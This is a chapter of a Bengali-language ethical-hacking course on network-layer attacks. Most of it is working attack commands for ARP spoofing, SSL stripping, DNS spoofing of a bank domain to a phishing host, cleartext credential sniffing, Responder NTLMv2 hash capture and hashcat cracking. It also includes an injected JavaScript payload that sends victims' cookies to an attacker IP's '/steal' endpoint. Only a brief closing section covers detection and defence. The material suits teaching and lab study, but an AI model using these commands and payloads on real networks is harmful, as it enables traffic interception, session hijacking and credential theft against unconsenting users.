---
title: 'Network Attacks'
subtitle: 'ARP spoofing, MITM, packet capture, credential sniffing, DNS poisoning — network লেয়ারে আক্রমণ।'
chapter: 8
level: 'intermediate'
readingTime: '12 মিনিট'
topics:
  ['ARP spoofing', 'MITM', 'Wireshark', 'tcpdump', 'Bettercap', 'DNS poisoning', 'network attacks']
---

<script>
	import Callout from '$lib/components/content/Callout.svelte';
</script>

<Callout type="info">

**বাস্তব জীবনের উদাহরণ**

ARP spoofing অনেকটা এমন — আপনি কারো পোস্টাল সার্ভিসকে বিশ্বাস করিয়ে দিলেন যে আপনিই তার ঠিকানা, এবং সেভাবে তার চিঠি মাঝপথে দখল করে নিলেন। 192.168.1.1-এ যাওয়া প্রতিটি packet আগে আপনার কাছে আসে, ফলে তার traffic-এর উপর আপনার পূর্ণ দৃশ্যমানতা (এবং পরিবর্তনের ক্ষমতা) থাকে।

</Callout>

## ARP এবং Trust-এর সমস্যা

ARP (Address Resolution Protocol) একটি লোকাল নেটওয়ার্কে IP অ্যাড্রেসকে MAC অ্যাড্রেসের সাথে ম্যাপ করে। এটি stateless এবং unauthenticated — যেকোনো মেশিন দাবি করতে পারে যে সে যেকোনো IP।

```
Normal:
  Host A asks: "Who has 192.168.1.1?"
  Router replies: "I do! My MAC is AA:BB:CC:DD:EE:FF"

ARP Spoofing:
  Attacker sends: "I have 192.168.1.1! My MAC is 11:22:33:44:55:66"
  Host A caches this (without verification)
  All traffic to 192.168.1.1 now goes to attacker
```

## Wireshark এবং tcpdump দিয়ে Packet Capture

সক্রিয় আক্রমণের আগে, traffic কীভাবে পড়তে হয় তা বুঝে নিন:

```bash
# tcpdump — CLI packet capture
sudo tcpdump -i eth0                         # capture all traffic
sudo tcpdump -i eth0 -w capture.pcap        # save to file
sudo tcpdump -i eth0 port 80                # HTTP only
sudo tcpdump -i eth0 host 192.168.1.100    # specific host
sudo tcpdump -i eth0 'tcp port 80 or tcp port 443'  # web traffic
sudo tcpdump -i eth0 -A port 80            # print ASCII content

# Read a saved capture
tcpdump -r capture.pcap
tcpdump -r capture.pcap -A | grep -i "password\|user\|login"

# Wireshark filters (in the GUI filter bar):
http                          # all HTTP
http.request.method == "POST" # POST requests only
http contains "password"      # packets containing "password"
ip.addr == 192.168.1.100     # traffic to/from specific IP
tcp.port == 21               # FTP
ftp-data                     # FTP data transfers
dns                          # DNS queries
```

## Bettercap দিয়ে ARP Spoofing

```bash
# Install
sudo apt install bettercap

# Enable IP forwarding (so traffic actually passes through)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Start bettercap
sudo bettercap -iface eth0

# Inside bettercap interactive shell:
# Discover hosts
net.probe on
net.show

# ARP spoof a single target (192.168.1.100) via router (192.168.1.1)
set arp.spoof.targets 192.168.1.100
set arp.spoof.internal true
arp.spoof on

# Now traffic flows: Target → Attacker → Router (and back)
# Capture with:
net.sniff on
net.sniff.filter tcp port 80   # only HTTP

# HTTP sniff (shows cleartext credentials)
http.proxy on

# Intercept and modify HTTP responses (inject JS)
set http.proxy.script inject.js
http.proxy on
```

```javascript
// inject.js — example script to inject into HTTP responses
function onResponse(req, res) {
	if (res.ContentType.includes('text/html')) {
		res.Body = res.Body.replace(
			'</body>',
			'<script>fetch("http://192.168.1.50/steal?c="+document.cookie)</script></body>'
		);
	}
}
```

## Ettercap দিয়ে Man-in-the-Middle

```bash
# Classic MITM tool
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//
# -T: text mode
# -M arp:remote: ARP MITM attack
# First target: victim
# Second target: router

# With filters (inject data)
# Create filter:
# if (ip.proto == TCP && tcp.dst == 80) {
#   replace("password", "PWNED");
# }
# Compile: etterfilter inject.ef -o inject.ef
ettercap -T -i eth0 -M arp -F inject.ef /192.168.1.100// /192.168.1.1//
```

## SSL Stripping

কোনো victim যদি https:// ছাড়া একটি URL টাইপ করে, তখন HTTPS নেমে HTTP-তে চলে যায়:

```bash
# SSLstrip — classic SSL stripping tool
# Works against: HTTP→HTTPS redirects (not HSTS-pinned sites)

# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Redirect port 80 to SSLstrip
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080

# Start sslstrip
sslstrip -l 8080 &

# Start ARP spoof
bettercap or arpspoof

# Monitor sslstrip.log for captured credentials
tail -f sslstrip.log | grep -i "password\|pass\|pwd"
```

**প্রতিরক্ষা:** `includeSubDomains` সহ HSTS (HTTP Strict Transport Security) এটি সম্পূর্ণভাবে প্রতিরোধ করে। এই কারণেই Chrome, HSTS-preloaded সাইটগুলোকে স্থায়ীভাবে secure হিসেবে চিহ্নিত করে।

## DNS Poisoning

```bash
# With bettercap — redirect specific domains
set dns.spoof.domains target-bank.com,*.evil.com
set dns.spoof.address 192.168.1.50   # your attacker IP
dns.spoof on

# Now: victim visits target-bank.com → resolves to your IP
# Host a phishing page on port 80
```

## Cleartext Protocol-এ Credential Sniffing

```bash
# Capture FTP credentials
sudo tcpdump -i eth0 -A port 21 | grep -i "user\|pass\|password"

# Capture HTTP POST data (login forms)
sudo tcpdump -i eth0 -A port 80 | grep -A 5 "POST"

# Capture Telnet (everything is cleartext)
sudo tcpdump -i eth0 -A port 23

# Dsniff — specialized credential sniffer
sudo dsniff -i eth0   # captures from FTP, Telnet, HTTP, etc.
sudo urlsnarf -i eth0 # show URLs being browsed
sudo mailsnarf -i eth0 # capture email (SMTP, POP3, IMAP)

# Wireshark follow TCP stream
# In Wireshark: Right-click a packet → Follow → TCP Stream
# See entire conversation in cleartext (if not encrypted)
```

## MITM অবস্থান থেকে Network Scanning

একবার traffic-এর পথে চলে এলে, আপনি সব internal নেটওয়ার্ক অ্যাড্রেস দেখতে পান:

```bash
# Passive host discovery from captured traffic
sudo p0f -i eth0    # passive OS fingerprinting
sudo netdiscover -i eth0 -r 192.168.1.0/24

# Responder — NBT-NS/LLMNR poisoner (Windows environments)
# When Windows machines fail DNS, they broadcast LLMNR/NBT-NS queries
# Responder answers all of them and captures NTLMv2 hashes
sudo responder -I eth0 -wrf

# Captured hashes appear as:
# [SMB] NTLMv2-SSP Hash  : alice::WORKGROUP:abc123...
# Crack with hashcat:
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

## বাস্তব প্রজেক্ট: Internal Network Lab

একটি কর্পোরেট নেটওয়ার্ক সিমুলেট করে এমন একটি lab সেট আপ করুন:

```bash
# Network topology:
# [Kali Attacker] ─────────────────── Switch ─── [Windows 10 Victim]
#                                       │
#                                  [Router/Gateway]
#                                  192.168.1.1

# 1. Put machines on same subnet (host-only or bridged VirtualBox network)

# 2. From Kali — discover network
sudo nmap -sn 192.168.1.0/24

# 3. Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# 4. ARP spoof the Windows machine
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &

# 5. Capture traffic
sudo wireshark -i eth0 &

# 6. On Windows victim — browse to http:// sites (not HTTPS)
# Observe credentials captured in Wireshark

# 7. Run Responder to capture Windows authentication
sudo responder -I eth0 -wrf

# 8. On Windows victim — browse to \\attacker-ip\ (fake file share)
# Responder captures NTLMv2 hash

# 9. Crack hash
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt --show
```

## প্রতিরক্ষা: MITM কীভাবে শনাক্ত করবেন

আক্রমণ বোঝা থাকলে শনাক্ত করা সহজ হয়:

```bash
# ARP cache inspection (look for duplicate MACs)
arp -a | sort -k4 | uniq -d -f3   # duplicate MAC addresses = ARP spoofing

# Dynamic ARP inspection (DAI) — switch-level defense
# Enabled on enterprise switches to validate ARP packets against DHCP snooping table

# Passive detection
# XArp: Windows GUI ARP spoof detector
# arpwatch: Linux — monitors ARP table for changes, emails on changes
sudo apt install arpwatch
sudo arpwatch -i eth0
```
